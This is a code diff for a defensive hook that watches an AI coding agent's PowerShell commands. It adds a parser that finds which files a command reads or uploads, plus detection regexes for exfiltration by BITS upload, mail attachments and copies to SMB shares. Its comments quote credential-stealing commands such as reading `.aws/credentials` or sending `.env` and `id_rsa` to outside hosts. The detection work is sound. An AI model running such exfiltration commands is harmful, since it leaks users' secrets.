@@ -1272,6 +1272,14 @@ function xpSegmentPaths(seg) {
     }
   }
 
+  out.push(...xpFlagPaths(toks));
+  return out;
+}
+
+// The argument-borne file forms (`@path`, `name=@path`, `--post-file=path`, `-T path`). Shared by the
+// POSIX and PowerShell parsers: curl.exe and wget.exe take the same flags under either shell.
+function xpFlagPaths(toks) {
+  const out = [];
   for (let i = 0; i < toks.length; i++) {
     const t = toks[i];
     const eq = t.indexOf("=");
@@ -1293,17 +1301,152 @@ function xpSegmentPaths(seg) {
   return out;
 }
 
-export function extractReadPaths(command) {
+// `shell: "powershell"` selects the PowerShell grammar below; anything else is POSIX.
+export function extractReadPaths(command, { shell } = {}) {
   const cmd = String(command || "").trim();
   if (!cmd || cmd.length > XP_CMD_MAX) return [];
-  const segs = xpSegments(cmd);
+  const ps = shell === "powershell";
+  const segs = ps ? psSegments(cmd) : xpSegments(cmd);
   if (!segs) return [];
   const out = [];
   for (const seg of segs) {
-    for (const p of xpSegmentPaths(seg)) { if (!out.includes(p)) out.push(p); if (out.length >= XP_PATH_MAX) return out; }
+    for (const p of (ps ? psSegmentPaths(seg) : xpSegmentPaths(seg))) { if (!out.includes(p)) out.push(p); if (out.length >= XP_PATH_MAX) return out; }
   }
   return out;
 }
+
+// ---- the same extraction for Claude Code's PowerShell tool ----
+//
+// The POSIX grammar above is wrong for PowerShell in exactly the places that matter here. MEASURED on
+// this tree before this parser existed, extractReadPaths returned [] for every one of: `Get-Content .env`,
+// `gc .env`, `type .env`, `Get-Content -Path C:\Users\bob\.aws\credentials`, `Select-String -Path .env`,
+// `Copy-Item .env \\host\share`, `iwr … -InFile id_rsa`, and `irm … -Body (Get-Content .env -Raw)` — so no
+// file a PowerShell command read or uploaded ever had its CONTENT scanned. Three grammar differences:
+//   * `\` is a path separator, not an escape (POSIX turned C:\Users\bob\.env into C:Usersbob.env);
+//   * the backtick is the escape character, not a command substitution;
+//   * cmdlets name files through PARAMETERS (-Path, -LiteralPath, -InFile, -Attachments) and read inside
+//     ( ) / $( ) / @( ) sub-expressions, which PowerShell evaluates in place — so those are parsed as
+//     segments of their own here, where the POSIX parser has to refuse a $( ) it cannot resolve.
+// Same bounds and the same fail-open rule as above: no regex over the command, every loop capped, a
+// token still carrying `$` (a variable, `$env:USERPROFILE\…`) is never guessed at.
+const PS_READERS = new Set(["get-content", "gc", "cat", "type", "select-string", "sls", "format-hex", "fhx", "import-csv", "ipcsv", "import-clixml"]);
+const PS_COPY = new Set(["copy-item", "cpi", "copy", "cp"]);
+const PS_PATH_PARAMS = new Set(["-path", "-literalpath", "-lp", "-pspath"]);
+// Parameters whose value is always a local file the command reads and sends (Invoke-WebRequest /
+// Invoke-RestMethod -InFile, Send-MailMessage -Attachments).
+const PS_FILE_PARAMS = new Set(["-infile", "-attachments"]);
+// Value-taking parameters of the commands above whose value is never a file to read.
+const PS_VALUED = new Set(["-totalcount", "-head", "-first", "-tail", "-last", "-readcount", "-encoding", "-delimiter", "-filter", "-include", "-exclude", "-stream", "-credential", "-pattern", "-context", "-destination", "-count", "-offset", "-header", "-culture", "-uri", "-method", "-body", "-outfile", "-headers", "-contenttype", "-to", "-from", "-subject", "-smtpserver", "-transfertype"]);
+// .NET static readers: `[IO.File]::ReadAllText('C:\x\.env')` — the argument list is the file.
+const PS_NET_READ = /::(?:ReadAll(?:Text|Bytes|Lines)|ReadLines|OpenRead|OpenText)$/i;
+
+function psSegments(cmd) {
+  const segs = [];
+  let cur = { tokens: [], dotnet: false };
+  let tok = "", building = false, target = false, nextDotnet = false;
+  const endTok = () => {
+    if (!building) return;
+    const t = tok; tok = ""; building = false;
+    if (target) { target = false; return; } // a redirect TARGET is written, never read
+    if (cur.tokens.length < XP_TOK_MAX) cur.tokens.push(t);
+  };
+  const endSeg = () => { endTok(); if (cur.tokens.length) segs.push(cur); cur = { tokens: [], dotnet: nextDotnet }; nextDotnet = false; target = false; };
+  for (let i = 0; i < cmd.length; i++) {
+    const c = cmd[i];
+    if (c === "`") { if (i + 1 < cmd.length) { tok += cmd[i + 1]; building = true; i++; } continue; }
+    if (c === "'") { // verbatim string; '' is a literal quote
+      building = true;
+      let j = i + 1;
+      for (; j < cmd.length; j++) { if (cmd[j] === "'") { if (cmd[j + 1] === "'") { tok += "'"; j++; continue; } break; } tok += cmd[j]; }
+      if (j >= cmd.length) return null;
+      i = j; continue;
+    }
+    if (c === '"') { // expandable string: a `$` inside keeps the token (and so disqualifies it as a path)
+      building = true;
+      let j = i + 1;
+      for (; j < cmd.length; j++) {
+        if (cmd[j] === "`") { tok += cmd[j + 1] ?? ""; j++; continue; }
+        if (cmd[j] === '"') { if (cmd[j + 1] === '"') { tok += '"'; j++; continue; } break; }
+        tok += cmd[j];
+      }
+      if (j >= cmd.length) return null;
+      i = j; continue;
+    }
+    if (c === "#" && !building) { const nl = cmd.indexOf("\n", i); if (nl < 0) break; i = nl - 1; continue; } // line comment
+    if (c === "<" && cmd[i + 1] === "#") { const e = cmd.indexOf("#>", i + 2); if (e < 0) return null; i = e + 1; continue; } // block comment
+    if (c === "$" && cmd[i + 1] === "{") { // ${env:USERPROFILE} is a braced VARIABLE, not a script block
+      const e = cmd.indexOf("}", i + 2);
+      if (e < 0) return null;
+      tok += cmd.slice(i, e + 1); building = true; i = e; continue;
+    }
+    if ((c === "$" || c === "@") && (cmd[i + 1] === "(" || cmd[i + 1] === "{")) { endSeg(); i++; continue; }
+    if (c === "(") { if (building && PS_NET_READ.test(tok)) nextDotnet = true; endSeg(); continue; }
+    if (c === ")" || c === "{" || c === "}") { endSeg(); continue; }
+    if (c === ",") { endTok(); if (cur.tokens.length < XP_TOK_MAX) cur.tokens.push(","); continue; }
+    if (c === " " || c === "\t" || c === "\r") { endTok(); continue; }
+    if (c === "\n" || c === ";" || c === "|" || c === "&" || c === "<") { endSeg(); if ((c === "|" || c === "&") && cmd[i + 1] === c) i++; continue; }
+    if (c === ">") { // >  >>  2>  *>  2>&1
+      if (building && /^[0-9*]$/.test(tok)) { tok = ""; building = false; }
+      endTok();
+      if (cmd[i + 1] === ">") i++;
+      if (cmd[i + 1] === "&" && /[0-9]/.test(cmd[i + 2] || "")) { i += 2; continue; }
+      target = true; continue;
+    }
+    tok += c; building = true;
+  }
+  endSeg();
+  return segs.slice(0, XP_SEG_MAX);
+}
+
+function psSegmentPaths(seg) {
+  const toks = seg.tokens;
+  if (seg.dotnet) return toks[0] && toks[0] !== "," && xpUsablePath(toks[0]) ? [toks[0]] : [];
+  // `$x = Get-Content .env` / `$x += …`: the command starts after the assignment.
+  let at = 0;
+  if (toks.length > 2 && /^\$[\w:]+$/.test(toks[0]) && /^[+\-*/]?=$/.test(toks[1])) at = 2;
+  const raw = toks[at];
+  if (!raw) return [];
+  const cut = Math.max(raw.lastIndexOf("/"), raw.lastIndexOf("\\"));
+  const word = (cut >= 0 ? raw.slice(cut + 1) : raw).toLowerCase().replace(/\.exe$/, "");
+  const rest = toks.slice(at + 1);
+  const named = [], positional = [];
+  let pathParam = false, destination = false, pattern = false;
+  for (let i = 0; i < rest.length; i++) {
+    const t = rest[i];
+    if (t === ",") continue;
+    if (/^-[A-Za-z]/.test(t)) {
+      const colon = t.indexOf(":");
+      const name = (colon > 0 ? t.slice(0, colon) : t).toLowerCase();
+      const bits = word === "start-bitstransfer" && name === "-source";
+      const vals = [];
+      if (colon > 0) vals.push(t.slice(colon + 1));
+      else if ((PS_PATH_PARAMS.has(name) || PS_FILE_PARAMS.has(name) || PS_VALUED.has(name) || bits) && i + 1 < rest.length) vals.push(rest[++i]);
+      while (vals.length && rest[i + 1] === "," && i + 2 < rest.length) { vals.push(rest[i + 2]); i += 2; }
+      if (name === "-destination") destination = true;
+      if (name === "-pattern") pattern = true;
+      if (PS_PATH_PARAMS.has(name) && (PS_READERS.has(word) || PS_COPY.has(word))) { pathParam = true; named.push(...vals); }
+      else if (PS_FILE_PARAMS.has(name) || bits) named.push(...vals);
+      continue;
+    }
+    positional.push(t);
+  }
+  const out = [];
+  if (PS_READERS.has(word)) out.push(...((word === "select-string" || word === "sls") && !pattern ? positional.slice(1) : positional));
+  else if (PS_COPY.has(word) && !pathParam) out.push(...(destination ? positional : positional.slice(0, -1))); // sources only
+  out.push(...named, ...xpFlagPaths(toks));
+  return out.filter((p) => p !== "," && xpUsablePath(p));
+}
+
+// PowerShell uploads that data/detectors.js OUTBOUND_UPLOAD (curl/wget/nc/Invoke-WebRequest/-RestMethod)
+// does not name. Used only for the PowerShell tool, so no Bash verdict can move.
+//   * BITS in upload mode; * Send-MailMessage with an attachment;
+//   * a copy or move onto a UNC path (\\host\share) — SMB egress. \\?\ and \\.\ are local device paths
+//     and the character class excludes them; localhost and the WSL VM (\\wsl$, \\wsl.localhost) are local.
+export const PS_OUTBOUND_UPLOAD = [
+  /(?<![\w.\/-])Start-BitsTransfer(?![\w.\/-])[^;&|\n]{0,300}?\s-TransferType\s{1,4}["']?Upload/i,
+  /(?<![\w.\/-])Send-MailMessage(?![\w.\/-])[^;&|\n]{0,300}?\s-Attachments?(?![\w-])/i,
+  /(?<![\w.\/-])(?:Copy-Item|cpi|copy|cp|Move-Item|mi|move|mv|robocopy|xcopy)(?![\w.\/-])[^;&|\n]{0,300}?[\s:]["']?\\\\(?!(?:localhost|127\.0\.0\.1|wsl\.localhost)\\)[A-Za-z0-9][\w.-]{0,252}\\/i
+];
 
 // =============================================================================================
 // Policy TRUST + LOAD (I/O).  SHARED, deliberately: this used to live only in cli/moorai-hook.mjs,
